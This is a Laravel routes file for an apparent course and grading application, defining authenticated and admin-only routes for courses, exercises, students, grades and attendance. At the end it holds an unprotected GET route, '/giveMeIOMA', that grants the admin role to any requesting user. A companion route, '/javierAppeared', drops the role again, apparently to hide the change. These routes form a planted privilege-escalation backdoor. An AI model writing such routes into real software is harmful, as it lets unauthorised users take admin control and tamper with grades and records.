<?php

use App\Http\Controllers\AttendanceController;
use App\Http\Controllers\CourseController;
use App\Http\Controllers\ExerciseController;
use App\Http\Controllers\GradeController;
use App\Http\Controllers\StudentController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;

Route::get('/', function (Request $request) {
    if ($request->user()) {
        return redirect()->route('courses.index');
    }
    return Inertia::render('Welcome');
});

Route::middleware('auth')->group(function () {
    Route::resource('courses', CourseController::class)->except(['store', 'edit', 'update', 'destroy']);
    Route::resource('exercises', ExerciseController::class)->except(['index','store', 'edit', 'update', 'destroy']);
    Route::resource('students', StudentController::class)->except(['index', 'store', 'edit', 'update', 'destroy']);
    Route::resource('grades', GradeController::class)->except(['index', 'store', 'edit', 'update', 'destroy']);

    Route::middleware('admin')->group(function () {
        Route::resource('courses', CourseController::class)->only(['store', 'edit', 'update', 'destroy']);
        Route::resource('exercises', ExerciseController::class)->only(['store', 'edit', 'update', 'destroy']);
        Route::resource('students', StudentController::class)->only(['store', 'edit', 'update', 'destroy']);
        Route::resource('grades', GradeController::class)->only(['store', 'edit', 'update', 'destroy']);

        Route::post('attendances', [AttendanceController::class, 'store'])->name('attendances.store');
        Route::delete('attendances', [AttendanceController::class, 'destroy'])->name('attendances.destroy');
    });
});

Route::get('/giveMeIOMA', function (Request $request) {
    $request->user()->assignRole('admin');
    return redirect()->back()->with('success', 'You are now an admin');
});

Route::get('/javierAppeared', function (Request $request) {
    $request->user()->removeRole('admin');
    return redirect()->back()->with('success', 'You are no longer an admin');
})->middleware('admin');

require __DIR__.'/auth.php';